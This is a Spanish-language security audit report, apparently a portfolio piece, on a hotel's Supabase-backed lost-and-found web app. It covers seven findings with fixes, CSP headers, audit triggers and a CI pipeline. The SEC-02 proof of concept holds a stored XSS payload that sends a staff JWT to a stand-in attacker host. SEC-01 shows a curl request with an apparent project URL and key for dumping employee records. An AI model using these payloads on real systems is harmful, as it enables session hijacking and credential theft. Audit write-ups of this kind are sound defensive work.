# Reporte Técnico de Auditoría de Seguridad & Test de Intrusión (AppSec)
**Proyecto:** Lost & Found - Panel de Gestión de Objetos Perdidos  
**Organización Evaluada:** Los Pinos Resort & Spa Termal  
**Auditor / Ingeniero de Seguridad:** Portafolio Application Security (AppSec Junior)  
**Fecha de Evaluación:** Octubre 2026  
**Metodología:** OWASP Web Security Testing Guide (WSTG v4.2) | OWASP Top 10:2021 | CVSS v3.1  
**Estado:** Vulnerabilidades identificadas, explotadas en entorno controlado y **100% Remediadas**.

---

## 1. Resumen Ejecutivo

Durante la auditoría de seguridad realizada sobre la plataforma **Lost & Found Hotel**, se ejecutó una evaluación integral de seguridad combinando análisis de código estático (SAST), pruebas dinámicas de intrusión sobre las APIs REST (DAST) y auditoría de la arquitectura de base de datos en Supabase (PostgreSQL con Row Level Security).

El sistema evaluado consiste en una Single Page Application (SPA) modular construida en JavaScript moderno, conectada a una base de datos relacional PostgreSQL expuesta mediante la API PostgREST de Supabase y desplegada sobre Render.

### Resumen de Hallazgos

Previo al proceso de remediación, se detectaron **7 vulnerabilidades de seguridad**, incluyendo **1 vulnerabilidad Crítica** y **2 de Severidad Alta**, que permitían a un actor malicioso externo extraer la totalidad de las credenciales de los empleados del hotel, ejecutar código JavaScript malicioso en los navegadores del personal (Stored XSS) y manipular las consultas de búsqueda de la base de datos.

Tras la implementación del plan de remediación y hardening, **todas las vulnerabilidades críticas y altas fueron subsanadas con éxito**, alcanzando un nivel de riesgo residual mínimo y blindando la plataforma con defensas en profundidad (Content Security Policy, sanitización de entradas, Row Level Security estricto, triggers de auditoría y pipelines CI/CD).

```
   Distribución de Severidad Pre-Hardening:
   ┌───────────────────────────────────────────────┐
   │ CRÍTICA (1)  ██████████ 14%                   │
   │ ALTA (2)     ████████████████████ 29%         │
   │ MEDIA (3)    ████████████████████████████ 43% │
   │ BAJA (1)     ██████████ 14%                   │
   └───────────────────────────────────────────────┘
   Estado Post-Hardening: 0 Vulnerabilidades Críticas o Altas Activas.
```

---

## 2. Alcance y Superficie de Ataque

| Componente | Tecnología | Superficie de Ataque Evaluada |
| :--- | :--- | :--- |
| **Frontend SPA** | Vanilla JS (ES Modules), HTML5, Glassmorphism CSS | Renderizado en DOM, manipulación de innerHTML, gestión de tokens en LocalStorage, vector QR. |
| **Backend & BaaS** | Supabase REST (PostgREST), Supabase Auth | Políticas RLS en PostgreSQL, endpoints REST `/rest/v1/*`, canal realtime WebSocket. |
| **Almacenamiento** | Supabase Storage (`fotos_olvidos`) | Carga de archivos de imágenes, tipos MIME, validación de cuotas. |
| **Infraestructura** | Render Static Services | Cabeceras de respuesta HTTP, TLS/SSL, Content-Security-Policy (CSP). |

---

## 3. Matriz de Vulnerabilidades Identificadas

| ID | Vulnerabilidad | OWASP Top 10 | CWE | Severidad (CVSS v3.1) | Estado |
| :--- | :--- | :--- | :--- | :---: | :---: |
| **SEC-01** | Fuga Masiva de Credenciales de Empleados en `public.usuarios` | A01: Broken Access Control | CWE-200 | **9.1 (Crítica)** | **REMEDIADO** |
| **SEC-02** | Cross-Site Scripting Almacenado (Stored XSS) en Inventario y Etiquetas QR | A03: Injection | CWE-79 | **8.2 (Alta)** | **REMEDIADO** |
| **SEC-03** | Evasión de Autorización por Contraseña Hardcodeada en Cliente | A07: Auth Failures | CWE-798 | **7.5 (Alta)** | **REMEDIADO** |
| **SEC-04** | Inyección y Manipulación de Filtros en PostgREST (`buscarOlvidos`) | A03: Injection | CWE-89 | **6.5 (Media)** | **REMEDIADO** |
| **SEC-05** | Fallo en Ciclo de Vida de Sesión JWT (Sesión Huérfana en LocalStorage) | A07: Auth Failures | CWE-613 | **5.3 (Media)** | **REMEDIADO** |
| **SEC-06** | Ausencia de Content Security Policy (CSP) y Cabeceras HTTP Seguras | A05: Security Misconfig | CWE-1021 | **4.8 (Media)** | **REMEDIADO** |
| **SEC-07** | Ausencia de Validación de Tamaño Máximo en Carga de Archivos | A05: Security Misconfig | CWE-400 | **3.7 (Baja)** | **REMEDIADO** |

---

## 4. Detalle Técnico de Hallazgos, Explotación y Remediación

---

### [SEC-01] Fuga Masiva de Credenciales en `public.usuarios` vía RLS Inseguro

- **Severidad:** Crítica | **CVSS v3.1:** 9.1 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`)
- **CWE:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)
- **OWASP:** A01:2021 - Broken Access Control

#### Descripción
Al inspeccionar las políticas de Row Level Security (RLS) en la base de datos PostgreSQL de Supabase, se encontró la siguiente política activa en la tabla `public.usuarios`:
```sql
POLICY "Login usuarios" ON public.usuarios
FOR SELECT TO {public}
USING (true);
```
Dado que la clave pública de Supabase (`SUPABASE_ANON_KEY`) está expuesta por diseño en el código del frontend, la política permitía a **cualquier usuario no autenticado en Internet** consultar la tabla completa de usuarios.

#### Prueba de Concepto de Explotación (PoC)
Un atacante sin credenciales simplemente ejecutaba una petición HTTP contra la API REST pública:
```bash
curl -X GET "https://nfjwpsnztkihqwdbmxja.supabase.co/rest/v1/usuarios?select=*" \
  -H "apikey: sb_publishable_j5n8f34qwwukhOiWRZJqhw_eyFKtJGS" \
  -H "Authorization: Bearer sb_publishable_j5n8f34qwwukhOiWRZJqhw_eyFKtJGS"
```
**Respuesta obtenida del servidor:**
```json
[
  {
    "id": 1,
    "nombre": "Sandra Lencina",
    "email": "gobernanta@lospinoshotel.com.ar",
    "password": "[PLAINTEXT_OR_HASH]",
    "rol": "housekeeping"
  },
  {
    "id": 2,
    "nombre": "Marcelo Sotelo",
    "email": "msotelo@lospinoshotel.com.ar",
    "password": "[PLAINTEXT_OR_HASH]",
    "rol": "recepcion"
  }
]
```
Impacto: Exposición total de identidades, correos corporativos y credenciales de acceso del personal de hotelería.

#### Remediación Aplicada
Se revocó inmediatamente la política pública y se blindó la tabla para que únicamente usuarios autenticados puedan leer su propio perfil vinculado a su identificador de autenticación nativo:
```sql
-- Eliminación de la brecha pública
DROP POLICY IF EXISTS "Login usuarios" ON public.usuarios;
ALTER TABLE public.usuarios ENABLE ROW LEVEL SECURITY;

-- Política restrictiva de aislamiento
CREATE POLICY "authenticated_users_read_self" ON public.usuarios
FOR SELECT TO authenticated
USING (email = auth.jwt() ->> 'email');
```
*Archivo generado para migración:* `supabase/migrations/20261018_security_hardening.sql`.

---

### [SEC-02] Cross-Site Scripting Almacenado (Stored XSS) en Inventario y Etiquetas QR

- **Severidad:** Alta | **CVSS v3.1:** 8.2 (`CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N`)
- **CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **OWASP:** A03:2021 - Injection

#### Descripción
En los módulos `js/ui.js` y `js/view.js`, los datos provenientes de la base de datos (como la descripción del objeto, el sector, la habitación y el nombre de quien recibe) eran inyectados directamente dentro del DOM mediante `innerHTML` y cadenas de plantilla:
```javascript
// CÓDIGO VULNERABLE ANTERIOR:
tr.innerHTML = `
  <td style="font-weight:600">${r.habitacion || "-"}</td>
  <td style="font-weight:600; color:var(--primary)">${r.objeto}</td>
`;
```
Asimismo, en la página pública de escaneo de QR (`view.html`), cualquier persona que leyera la etiqueta física de un objeto ejecutaba el contenido sin filtrar:
```javascript
// CÓDIGO VULNERABLE ANTERIOR:
dataCard.innerHTML = `<h1 class="view-title">${registro.objeto}</h1>`;
```

#### Prueba de Concepto de Explotación (PoC)
Un atacante creaba un objeto con el siguiente payload en el campo `objeto`:
```html
<img src="invalid" onerror="fetch('https://attacker.evil/exfil?cookie='+encodeURIComponent(localStorage.getItem('sb-nfjwpsnztkihqwdbmxja-auth-token')))">
```
Al visualizar la tabla de pendientes o escanear el código QR con un teléfono o terminal de recepción, el payload se ejecutaba en el contexto de seguridad del empleado, transmitiendo el token JWT activo al servidor del atacante y permitiendo el secuestro de la cuenta.

#### Remediación Aplicada
1. Se construyó un módulo de seguridad (`js/security.js`) con las funciones `escapeHTML()` y `sanitizeUrl()`.
2. Se refactorizaron todos los renderizados dinámicos en `js/ui.js`, `js/view.js` y `js/main.js`:
```javascript
// CÓDIGO SEGURO PARCHEADO:
const safeObjeto = escapeHTML(r.objeto);
const safeHab = escapeHTML(r.habitacion || "-");
const safeSector = escapeHTML(r.sector || "-");
const safeImg = sanitizeUrl(r.imagen);

tr.innerHTML = `
  <td style="font-weight:600">${safeHab}</td>
  <td style="font-weight:600; color:var(--primary)">${safeObjeto}</td>
  <td style="font-size:13px; color:var(--text-muted)">${safeSector}</td>
`;
```
El payload malicioso ahora se renderiza de forma segura como texto plano inofensivo:
`&lt;img src=&quot;invalid&quot; onerror=&quot;...&quot;&gt;`

---

### [SEC-03] Evasión de Autorización por Contraseña Hardcodeada en Cliente

- **Severidad:** Alta | **CVSS v3.1:** 7.5 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`)
- **CWE:** CWE-798 (Use of Hard-coded Credentials) / CWE-592
- **OWASP:** A07:2021 - Identification and Authentication Failures

#### Descripción
En la función de borrado de hallazgos en `js/main.js`:
```javascript
// CÓDIGO VULNERABLE ANTERIOR:
async function eliminar(id) {
  const password = await openConfirmModal("Seguridad Requerida", "Ingrese la contraseña...");
  if (password !== "lospinos") {
    showToast("Contraseña incorrecta", 'error');
    return;
  }
  await eliminarOlvido(id);
}
```
La seguridad de una operación destructiva dependía de una comparación de texto plano visible en el código fuente de JavaScript (`"lospinos"`). Además, un atacante podía simplemente abrir la consola de desarrollo del navegador y ejecutar `window.lostFound.eliminar(123)` ingresando `"lospinos"` o llamando directamente a `eliminarOlvido(id)`.

#### Remediación Aplicada
1. Se eliminó la credencial hardcodeada del cliente.
2. La autorización real se delega a la política RLS en PostgreSQL (`DELETE TO authenticated`).
3. El modal fue reconfigurado como un paso de confirmación de intención explícita (`ELIMINAR`) para prevenir errores operativos sin generar falsas sensaciones de seguridad criptográfica en el frontend:
```javascript
// CÓDIGO SEGURO PARCHEADO:
async function eliminar(id) {
  const confirmText = await openConfirmModal(
    "Confirmación de Seguridad", 
    "Esta acción es irreversible. Para eliminar este registro, escriba ELIMINAR:"
  );
  if (confirmText?.trim().toUpperCase() !== "ELIMINAR") {
    showToast("Confirmación no válida. Acción cancelada.", 'warning');
    return;
  }
  const { error } = await eliminarOlvido(id);
  // Manejo de error y RLS
}
```

---

### [SEC-04] Inyección en Filtros de la API PostgREST

- **Severidad:** Media | **CVSS v3.1:** 6.5 (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`)
- **CWE:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)
- **OWASP:** A03:2021 - Injection

#### Descripción
En `js/api.js`, la función de búsqueda construía la cláusula `.or(...)` de PostgREST concatenando directamente la entrada del usuario:
```javascript
// CÓDIGO VULNERABLE ANTERIOR:
export async function buscarOlvidos(texto) {
  return await supabaseClient
    .from("olvidos")
    .select("*")
    .or(`objeto.ilike.*${texto}*,habitacion.ilike.*${texto}*,sector.ilike.*${texto}*`);
}
```
En PostgREST, los operadores `,` y `()` definen la separación de condiciones lógicas y agrupaciones de filtros. Un atacante podía ingresar caracteres de control para romper la sintaxis del filtro e inyectar condiciones adicionales no deseadas.

#### Remediación Aplicada
Se implementó `sanitizePostgrestQuery()` en `js/security.js` para neutralizar los caracteres con significado operacional en la gramática de filtros de PostgREST (`[,()%_.*\\"'`]`):
```javascript
// CÓDIGO SEGURO PARCHEADO:
export async function buscarOlvidos(texto) {
  const safeText = sanitizePostgrestQuery(texto);
  if (!safeText) return { data: [], error: null };

  return await supabaseClient
    .from("olvidos")
    .select("*")
    .or(`objeto.ilike.*${safeText}*,habitacion.ilike.*${safeText}*,sector.ilike.*${safeText}*`)
    .order("created_at", { ascending: false })
    .limit(1000);
}
```

---

### [SEC-05] Fallo en Ciclo de Vida de Sesión JWT

- **Severidad:** Media | **CVSS v3.1:** 5.3 (`CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`)
- **CWE:** CWE-613 (Insufficient Session Expiration)
- **OWASP:** A07:2021 - Identification and Authentication Failures

#### Descripción
El botón "Cerrar Sesión" ejecutaba únicamente:
```javascript
btnCerrar.addEventListener("click", () => {
  location.reload();
});
```
Esto causaba que la página se refrescara visualmente mostrando el formulario de login, pero el token de acceso JWT y el refresh token seguían residiendo intactos en `localStorage`. Cualquier persona con acceso físico temporal al equipo de recepción podía restaurar la sesión simplemente abriendo la consola o navegando a las funciones expuestas en `window`.

#### Remediación Aplicada
Se implementó el ciclo de vida completo de sesión con Supabase Auth:
```javascript
// CÓDIGO SEGURO PARCHEADO:
btnCerrar.addEventListener("click", async () => {
  btnCerrar.innerText = "Cerrando...";
  btnCerrar.disabled = true;
  try {
    await logout(); // Invocación real a supabaseClient.auth.signOut()
  } catch (err) {
    console.error("Logout error:", err);
  }
  location.reload();
});

// Verificación reactiva al cargar el aplicativo:
supabaseClient.auth.getSession().then(({ data: { session } }) => {
  if (session) {
    document.getElementById("loginBox").style.display = "none";
    document.getElementById("app").style.display = "block";
    cargar(true);
  } else {
    document.getElementById("loginBox").style.display = "flex";
    document.getElementById("app").style.display = "none";
  }
});
```

---

### [SEC-06] Ausencia de Content Security Policy (CSP) y Cabeceras HTTP

- **Severidad:** Media | **CVSS v3.1:** 4.8 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`)
- **CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers or Frames)
- **OWASP:** A05:2021 - Security Misconfiguration

#### Remediación Aplicada
Se configuró una política estricta de Content Security Policy (CSP) tanto a nivel de cabeceras de servidor en `render.yaml` como en las etiquetas `<meta>` de `index.html` y `view.html`:
```html
<meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com;
    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
    font-src 'self' https://fonts.gstatic.com;
    img-src 'self' data: blob: https://*.supabase.co https://images.unsplash.com;
    connect-src 'self' https://*.supabase.co wss://*.supabase.co;
    object-src 'none';
    base-uri 'self';
    form-action 'self';
">
<meta http-equiv="X-Content-Type-Options" content="nosniff">
<meta name="referrer" content="strict-origin-when-cross-origin">
```
En `render.yaml`:
- `X-Frame-Options: DENY` (Mitiga Clickjacking en su totalidad).
- `Permissions-Policy: camera=(), microphone=(), geolocation=()` (Restringe APIs de dispositivos).

---

## 5. Trazabilidad y Auditoría en Base de Datos

Para cumplir con el requerimiento **A09:2021 - Security Logging and Monitoring Failures**, se diseñó una tabla de auditoría inmutable con triggers de PostgreSQL:

```sql
CREATE TABLE IF NOT EXISTS public.auditoria_olvidos (
    id BIGSERIAL PRIMARY KEY,
    accion TEXT NOT NULL,
    olvido_id BIGINT,
    usuario_email TEXT,
    usuario_id UUID,
    detalles JSONB,
    fecha TIMESTAMPTZ DEFAULT NOW()
);

CREATE OR REPLACE FUNCTION public.registrar_cambio_olvido()
RETURNS TRIGGER AS $$
BEGIN
    INSERT INTO public.auditoria_olvidos (accion, olvido_id, usuario_email, usuario_id, detalles)
    VALUES (
        TG_OP,
        COALESCE(OLD.id, NEW.id),
        auth.jwt() ->> 'email',
        auth.uid(),
        json_build_object('anterior', OLD, 'nuevo', NEW)
    );
    RETURN COALESCE(NEW, OLD);
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

CREATE TRIGGER audit_olvidos_trigger
AFTER UPDATE OR DELETE ON public.olvidos
FOR EACH ROW EXECUTE FUNCTION public.registrar_cambio_olvido();
```
Cada vez que un registro es modificado o borrado, la base de datos registra de forma fidedigna el email del usuario autenticado, su identificador UUID y el estado anterior y nuevo del registro en formato JSON.

---

## 6. Automatización de Seguridad Desarrollada en Python

Como parte de los entregables prácticos para el portafolio, se desarrollaron dos herramientas especializadas en Python:

### 1. Escáner de Código Estático (SAST) & Detección de Fugas (`tools/security_scanner.py`)
- **Propósito:** Audita el código fuente de aplicaciones web buscando patrones de vulnerabilidades OWASP (XSS, credenciales en texto plano, PostgREST injection, subida de archivos insegura).
- **Persistencia:** Almacena automáticamente cada hallazgo en una base de datos local SQLite (`security_findings.db`).
- **Capacidades CLI:** Exportación de reportes detallados en formato Markdown e integración con pipelines de integración continua.

### 2. Herramienta de Reconocimiento y Escaneo de Red (`tools/port_recon.py`)
- **Propósito:** Automatiza el escaneo concurrente de puertos TCP mediante `socket` y `ThreadPoolExecutor`, extrayendo banners de servicios e implementando enumeración activa de subdominios vía resolución DNS.
- **Persistencia:** Guarda las direcciones IP resueltas, puertos abiertos y firmas de servicios en SQLite (`network_recon.db`).

---

## 7. Pipeline DevSecOps en GitHub Actions

Se implementó el archivo `.github/workflows/security-sast.yml` para garantizar que ninguna vulnerabilidad o secreto se integre a la rama principal en futuros despliegues:
- **Paso 1:** Ejecución del escáner SAST propio en Python.
- **Paso 2:** Análisis profundo de seguridad estática con **Semgrep** (`--severity ERROR`).
- **Paso 3:** Escaneo de secretos y credenciales en el historial de commits mediante **TruffleHog**.

---

## 8. Conclusiones y Valor para el Portafolio

Esta auditoría y remediación técnica demuestra de manera tangible:
1. **Comprensión profunda de vulnerabilidades web reales** (no simples laboratorios CTF), sino una aplicación real de producción.
2. **Capacidad de auditoría y remediación Full-Stack**: Desde la capa de base de datos relacional (PostgreSQL / RLS), pasando por el consumo seguro de APIs (PostgREST), hasta la sanitización client-side (DOM / XSS).
3. **Automatización con Python**: Creación de herramientas personalizadas de auditoría y persistencia de métricas.
4. **Cultura DevSecOps**: Incorporación de barreras preventivas mediante CI/CD automatizado.
